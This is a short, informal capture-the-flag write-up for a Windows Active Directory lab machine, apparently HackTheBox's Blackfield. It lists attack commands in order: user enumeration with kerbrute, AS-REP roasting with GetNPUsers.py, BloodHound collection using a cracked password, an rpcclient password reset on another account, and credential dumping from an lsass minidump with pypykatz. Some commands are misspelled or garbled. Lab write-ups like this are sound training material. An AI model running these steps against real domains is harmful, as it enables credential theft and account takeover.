we did everything , rpcc ,kerberosetc with null password and username and got nothing \

Smb was open for non authenticated users

all fileanmes were username

we used  `cat tmp | awk '{print $1}' | awk -F '\]'| awk -F '\[' '{print $2}'`

we got many usernames so to confirm which username is

`kerbrute -domain blackfield.local -users users.txt -dc-ip 10.10.10.192`

we did ./kerbrute

and to get hash of confirmed user we did Getnpusers.py

`GetNPUsers.py blackfield.local/support -dc-ip 10.10.10.192 -no-pass`

we got password for support

if we log in rpccclient we get other many users

we ran all the same commands for new users but no luck

now we had password and username so we can bloodhound.py on it and we get success in it

`bloodhound.py -d blackfield.local -u support -p '#00^BlackKnight' -g DC01.blackfield.local -c all -ns 10.10.10.192`

it said we can change password of audit so we logged in rpcclinet and

`setuserinfo2 audit2020 23 Password123`

it had password complexity

and we logged on smb and got ==lsass==.zip file with on using ==pypykzt== we dumped it and got cred for svc_backup

`pypykatz lsa minidump lsass.DMP `

we got user flag

now the priv esc was Sebackupprivilage
